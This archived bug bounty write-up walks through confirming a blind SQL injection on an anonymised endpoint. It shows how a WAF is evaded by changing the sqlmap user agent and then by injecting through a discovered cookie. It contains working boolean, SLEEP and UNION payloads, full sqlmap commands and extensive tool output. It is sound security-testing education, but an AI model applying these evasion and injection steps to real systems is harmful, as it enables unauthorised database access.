# Find SQL injection with burp Suite scanner

- **Source URL:** https://awais0x1.medium.com/discovering-an-sql-injection-with-burps-scanner-41c6c5910d84?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20260502214354/https://awais0x1.medium.com/discovering-an-sql-injection-with-burps-scanner-41c6c5910d84
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/13457 (id 13457)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Find SQL injection with burp Suite scanner

During a **testing**, we came across this situation:

Burp’s scanner has detected a potential **SQL injection** on one of my bug bounty program target endpoints. According to it, the `idEntity` parameter of this endpoint is vulnerable. For this type of vulnerability, it would be ideal to use the sqlmap tool in order to facilitate the exploitation and demonstrate the impact of this vulnerability.

However, when sqlmap is run targeting this parameter, no vulnerability is detected

```
$ sqlmap -u https://www.exemple.com/endpoint?idEntity=442 -p idEntity 
[*] starting @ 12:38:54 /2022-09-28/
[12:38:54] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=ed22131de21...2c78d23ba1'). Do you want to use those [Y/n] Y
[12:38:56] [INFO] testing if the target URL content is stable
[12:38:56] [WARNING] heuristic (basic) test shows that GET parameter 'idEntity' might not be injectable
...
[12:39:18] [WARNING] GET parameter 'idEntity' does not seem to be injectable
[12:39:18] [CRITICAL] all tested parameters do not appear to be injectable. ...
```
No exploitation is possible with this result, but it would be a mistake to give up so quickly. From this situation, we will perform several actions to:

- Confirm that this is not a false positive
- Determine why sqlmap does not detect the vulnerability
- Find a solution so that sqlmap can still exploit this endpoint

## Confirming the SQL injection vulnerability

Here we will try to confirm that this is not a false positive and that the SQL Injection is present. To do this, we need to look at the legitimate behaviour of the endpoint and compare this behaviour with the elements identified by Burp.

## Legitimate behaviour of the endpoint and the idEntity parameter

From the BURP Repeater, we can observe how the endpoint works. We can see that when the `idEntity` parameter is used, the server returns the name associated with the target entity somewhere in its response.

**Valid legitimate request**:

```
GET /endpoint?idEntity=442 HTTP/1.1
Host: www.exemple.com
```
**Extract from the valid legitimate response**:

```
HTTP/1.1 200 OK
Date: Tue, 13 Dec 2022 13:20:37 GMT
```
```
...
<... nameEntity="Rubeus Agrid" ...>
...
```
In addition, manual tests determine that when the `idEntity` parameter value is invalid, the nameEntity field returned in the response is empty.

**Invalid legitimate request:**

```
GET /endpoint?idEntity=0 HTTP/1.1
Host: www.exemple.com
```
**Extract from the invalid legitimate response:**

```
HTTP/1.1 200 OK
Date: Tue, 13 Dec 2022 13:20:37 GMT
```
```
...
<... nameEntity="" ...>
...
```
## Detail of the behaviour identified by BURP

The requests that allowed Burp to identify the potential vulnerability can be viewed directly.

The content of these requests and responses is given below.

**Request 1:**

```
GET /endpoint?idEntity=44252262402+or+2346=02346 HTTP/1.1
Host: www.exemple.com
```
**Extract from response 1:**

```
HTTP/1.1 200 OK
...
```
```
...
<... NameEntity="John Smith" ...>
...
```
**Request 2:**

```
GET /endpoint?idEntity=44291517249+or+6362=6367 HTTP/1.1
Host: www.exemple.com
...
```
**Extract from response 2:**

```
HTTP/1.1 200 OK
...
```
```
...
<... NameEntity="" ...>
...
```
## Analysing the requests

With these requests, we observe that a boolean-blind injection seems to have worked. The first payload can be simplified in this way by applying the SQL operators `or` and `=`:

```
idEntity = 44252262402 or 2346=2346
idEntity = 44252262402 or 1
1
```
The server responds positively with `<… NameEntity="John Smith" …>`. The condition on `idEntity` is bypassed by our injection. In its processing, the server returns the very first entity it encounters. That is, the one with id `1`.

The second payload can be simplified as follows:

```
idEntity = 44291517249 or 6362=6367
idEntity = 44291517249 or 0
idEntity = 44291517249
```
Since `44291517249` is an invalid value (no associated entity), the server responds with `<… NameEntity="" …>` .

Replaying these requests confirms that the SQL Operators are being interpreted correctly by the server. At this point, we have good reason to believe that the boolean-blind injection is not a false positive.

## Debugging sqlmap

## Adjusting sqlmap

Now that we have a better understanding of what is going on, we can try to restart sqlmap with some additional options:

- `--technique=B` to specify that we want to use a boolean-blind injection technique
- `--not-string=nameEntity=""` to indicate that the SQL query fails when the server returns this string
- `--proxy=http://localhost:8080` to redirect the sqlmap traffic to our Burp proxy

Running sqlmap with these new options, we get this result:

```
$ sqlmap -u https://www.example.com/endpoint?idEntity=442 -p idEntity --technique=B --not-string='nameEntity = "";' --proxy=http://localhost:8080
[*] starting @ 16:45:37 /2022-09-28/
```
\[16:45:37\] \[INFO\] testing connection to the target URL

you have not declared cookie(s), while server wants to set its own ('PHPSESSID=abb6bd689d5...2bd0ef7098'). Do you want to use those \[Y/n\] Y

\[16:45:39\] \[WARNING\] heuristic (basic) test shows that GET parameter 'idEntity' might not be injectable

\[16:45:39\] \[INFO\] testing for SQL injection on GET parameter 'idEntity'

\[16:45:39\] \[INFO\] testing 'AND boolean-based blind - WHERE or HAVING clause'

\[16:45:42\] \[INFO\] testing 'Boolean-based blind - Parameter replace (original value)'

\[16:45:42\] \[WARNING\] GET parameter 'idEntity' does not seem to be injectable

\[16:45:42\] \[CRITICAL\] all tested parameters do not appear to be injectable. ...\[\*\] ending @ 16:45:42 /2022-09-28/

## Traffic analysis

The result is still not what we expected. But now the traffic is going through our proxy. Thanks to this, we can identify what is blocking thanks to the captured requests. Here is what we observe:

**Request:**

```
GET /endpoint?idEntity=442<payload_SQLMAP> HTTP/1.1
User-Agent: sqlmap/1.6.8#stable (https://sqlmap.org)
Host: www.exemple.com
...
```
**Response:**

```
HTTP/1.1 200 OK
...
Content-Length: 0
```
The above response is observed for each request sent. It consists of an empty HTTP 200 response (content-Lenght: 0). The presence of a WAF (Web Application Firewall) would be at the origin of sqlmap’s failure. The server sends back an empty response each time the WAF thinks it is under attack.

## Hypothesis confirmation

This assumption is confirmed when trying to send a SLEEP instruction manually via the Repeater.

**Manual request of a Time-Based injection:**

```
GET /endpoint?idEntity=442+and+SLEEP(5)+-- HTTP/1.1
Host: www.exemple.com
```
**Extract from the response:**

```
HTTP/1.1 200 OK
...
Content-Length: 0
```
An empty response is returned by the server indicating that the WAF has reacted to our payload.

## First escape method

In order to push our exploitation, it is necessary to send our payloads without being detected by the WAF. We already obtain a first encouraging result just by modifying the `user-agent` of our requests:

- `-A " NONE "`: Change the user-agent from `sqlmap/1.6.8#stable (https://sqlmap.org)` to `NONE`

`$ sqlmap -u https://www.exemple.com/endpoint?idEntity=442 -p idEntity --technique=B --not-string='nomEntity = ""' --proxy=http://localhost:8080 -A "NONE"`
\[\*\] starting @ 16:36:42 /2022-09-28/\[16:36:42\] \[INFO\] testing connection to the target URL

\[16:36:44\] \[WARNING\] potential CAPTCHA protection mechanism detected

you have not declared cookie(s), while server wants to set its own ('PHPSESSID=2712093e2d7...39857346b9'). Do you want to use those \[Y/n\] Y

\[16:36:47\] \[WARNING\] heuristic (basic) test shows that GET parameter 'idEntity' might not be injectable

\[16:36:49\] \[INFO\] testing for SQL injection on GET parameter 'idEntity'

\[16:36:49\] \[INFO\] testing 'AND boolean-based blind - WHERE or HAVING clause'

\[16:36:51\] \[WARNING\] reflective value(s) found and filtering out

\[16:36:57\] \[INFO\] GET parameter 'idEntity' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable

\[16:37:23\] \[INFO\] checking if the injection point on GET parameter 'idEntity' is a false positive

GET parameter 'idEntity' is vulnerable. Do you want to keep testing the others (if any)? \[y/N\] N

sqlmap identified the following injection point(s) with a total of 16 HTTP(s) requests:

---

Parameter: idEntity (GET)

Type: boolean-based blind

Title: AND boolean-based blind - WHERE or HAVING clause

Payload: idEntity=442 AND 4465=4465

---

\[16:37:37\] \[INFO\] testing Altibase

\[16:37:38\] \[WARNING\] the back-end DBMS is not Altibase

\[16:37:38\] \[INFO\] testing MySQL

\[16:37:39\] \[INFO\] confirming MySQL

Thus, we get confirmation that the endpoint is vulnerable to SQL injections with the boolean-blind method.

## Limits

Unfortunately, even if we managed to detect the vulnerability, it is still not enough to allow a full exploitation. Below is the exploitation attempt to retrieve the database names:

`$ sqlmap -u https://www.exemple.com/endpoint?idEntity=442 -p idEntity --technique=B --not-string='nomEntity = ""' --proxy=http://localhost:8080 -A "NONE" -dbs`
\[\*\] starting @ 17:22:32 /2022-09-28/\[17:22:32\] \[INFO\] resuming back-end DBMS 'mysql'

\[17:22:32\] \[INFO\] testing connection to the target URL

\[17:22:34\] \[WARNING\] potential CAPTCHA protection mechanism detected

you have not declared cookie(s), while server wants to set its own ('PHPSESSID=d3a6945d5a7...3994752cf5'). Do you want to use those \[Y/n\] Y

sqlmap resumed the following injection point(s) from stored session:

---

Parameter: idEntity (GET)

Type: boolean-based blind

Title: AND boolean-based blind - WHERE or HAVING clause

Payload: idEntity=442 AND 4325=4325

---

\[17:22:37\] \[INFO\] the back-end DBMS is MySQL

\[17:22:37\] \[INFO\] fetching database names

\[17:22:37\] \[INFO\] fetching number of databases

\[17:22:37\] \[WARNING\] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval

\[17:22:37\] \[INFO\] retrieved:

\[17:22:38\] \[WARNING\] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'

\[17:22:38\] \[ERROR\] unable to retrieve the number of databases

\[17:22:38\] \[INFO\] falling back to current database

\[17:22:38\] \[INFO\] fetching current database

\[17:22:38\] \[INFO\] retrieved:

\[17:23:06\] \[CRITICAL\] unable to retrieve the database names

This is because the WAF keeps blocking payloads that allow data extraction (SELECT, SLEEP, FROM, WHERE, etc.).

In this situation, we can use the `--tamper` option of sqlmap. This option allows us to load a payload transformation script(s) in order to bypass the WAF. The documentation on this option can be consulted [HERE](https://github.com/sqlmapproject/sqlmap/wiki/Usage#tamper-injection-data) and the list of scripts that can be used by this option can be consulted via the command:

`sqlmap --list-tamper`
Unfortunately, in our case none of the proposed scripts worked. While we were so close to our goal, the operation seemed impossible.

Unless…

## Exploiting the SQL injection

So far we have only looked at the `idEntity` parameter of the endpoint. After a brief investigation, we launched other tools in the hope of unblocking the situation. Thanks to the BURP `ParamMiner` extension, we were able to follow another lead. This extension offers to fuzz an endpoint in order to identify other parameters, headers or cookies used by the endpoint. It is with this tool that the `idEntitySelected` cookie was discovered.

## idEntitySelected Cookie

When this cookie is present in the request and the `GET idEntity` parameter is absent, then the server displays the entity information corresponding to the cookie value. They work in a similar way. From a functional point of view, this cookie should be used to save the user’s choice when selecting an entity.

**Request:**

```
GET /endpoint HTTP/1.1
Host: www.exemple.fr
Cookie: idEntitySelected=
```
**Response:**

```
HTTP/1.1 200 OK
...
```
```
...
<... NameEntity="John Smith" ...>
...
```
## Bypassing the WAF

With BURP’s Repeater, we can observe the WAF’s behaviour with this cookie. And we are happy to see that the `SLEEP` statement is not detected by the WAF and that it does indeed delay the server response.

**Request**:

```
GET /endpoint HTTP/1.1
Host: www.exemple.fr
Cookie: idEntitySelected=1+or+SLEEP(5)--
```
**Response** (obtained after 5 seconds delay):

```
HTTP/1.1 200 OK
...
```
```
...
<... NameEntity="John Smith" ...>
...
```
## Adapting to sqlmap

From these manual tests, we understand that the WAF applies strict control over the GET parameters of requests. On the other hand, it is more lax on cookie values. Our exploitation of the vulnerability can therefore go through the `idEntitySelected` cookie for an effective bypass of the WAF.

Here are the new parameters to be added to include the cookie as a new injectable element.

- `--cookie='idEntitySelected=1'`: the cookie to include in the request
- `--level=2`: at least level 2 scanning is required to include cookies as injectable parameters
- `--param-filter=cookie`: we specify that we are only interested in cookies

Also, we remove the `--technique=B` option because other injection methods seem possible with this new parameter.

So our new sqlmap command gets this result:

`$ sqlmap -u https://www.exemple.com/endpoint --cookie='idEntitySelected=1' --level=2 --param-filter=cookie --not-string='nameEntity = "";' --proxy=http://localhost:8080 -A "NONE"`
\[\*\] starting @ 18:07:35 /2022-09-28/\[18:07:35\] \[WARNING\] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'

do you want to try URI injections in the target URL itself? \[Y/n/q\] n

\[18:07:36\] \[INFO\] resuming back-end DBMS 'mysql'

\[18:07:36\] \[INFO\] testing connection to the target URL

\[18:07:38\] \[WARNING\] potential CAPTCHA protection mechanism detected

\[18:07:38\] \[INFO\] testing if Cookie parameter 'idEntitySelected' is dynamic

do you want to URL encode cookie values (implementation specific)? \[Y/n\] Y

\[18:07:45\] \[INFO\] Cookie parameter 'idEntitySelected' appears to be dynamic

\[18:07:48\] \[WARNING\] reflective value(s) found and filtering out

\[18:07:48\] \[INFO\] heuristic (basic) test shows that Cookie parameter 'idEntitySelected' might be injectable

\[18:07:51\] \[INFO\] testing for SQL injection on Cookie parameter 'idEntitySelected'

\[18:07:51\] \[INFO\] testing 'AND boolean-based blind - WHERE or HAVING clause'

\[18:08:01\] \[INFO\] Cookie parameter 'idEntitySelected' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable

\[18:08:01\] \[INFO\] testing 'Generic inline queries'

\[18:08:02\] \[INFO\] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'

\[18:08:04\] \[INFO\] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'

\[18:08:05\] \[INFO\] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'

\[18:08:06\] \[INFO\] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'

\[18:08:07\] \[INFO\] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'

\[18:08:09\] \[INFO\] testing 'MySQL inline queries'

\[18:08:10\] \[INFO\] testing 'MySQL >= 5.0.12 stacked queries (comment)'

\[18:08:10\] \[WARNING\] time-based comparison requires larger statistical model, please wait............ (done)

\[18:08:23\] \[INFO\] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'

\[18:08:36\] \[INFO\] Cookie parameter 'idEntitySelected' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable

it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? \[Y/n\] Y

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (1) values? \[Y/n\] Y

\[18:08:59\] \[INFO\] testing 'Generic UNION query (NULL) - 1 to 20 columns'

\[18:08:59\] \[INFO\] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found

\[18:09:01\] \[INFO\] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test

\[18:09:06\] \[INFO\] target URL appears to have 1 column in query

\[18:09:10\] \[INFO\] Cookie parameter 'idEntitySelected' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable

Cookie parameter 'idEntitySelected' is vulnerable. Do you want to keep testing the others (if any)? \[y/N\] N

sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:

---

Parameter: idEntitySelectede (Cookie)

Type: boolean-based blind

Title: AND boolean-based blind - WHERE or HAVING clause

Payload: idEntitySelected=1 AND 5547=5547 Type: time-based blind

Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)

Payload: idEntitySelected=1 AND (SELECT 6499 FROM (SELECT(SLEEP(5)))Dwtl) Type: UNION query

Title: Generic UNION query (NULL) - 1 column

Payload: idEntitySelected=-1931 UNION ALL SELECT CONCAT(0x716a717671,0x624e4644416d526271536d6d57414c527a44616959765253704872496e7976616a447262626f746f,0x717a6a6271)-- -

---

\[18:09:18\] \[INFO\] the back-end DBMS is MySQL\[\*\] ending @ 18:09:18 /2022-09-28/

And this is the jackpot!

Not only could additional injection techniques be discovered (UNION being much more efficient than the other two), but the reading of database elements is now possible.

All that remains is to run the previous command again, adding the [sqlmap enumeration options](https://github.com/sqlmapproject/sqlmap/wiki/Usage#enumeration) to obtain the contents of the database.

We are now able to effectively exploit our vulnerability. This level of exploitation would probably not have been possible if we had not taken a detailed look at how the endpoint and sqlmap work.
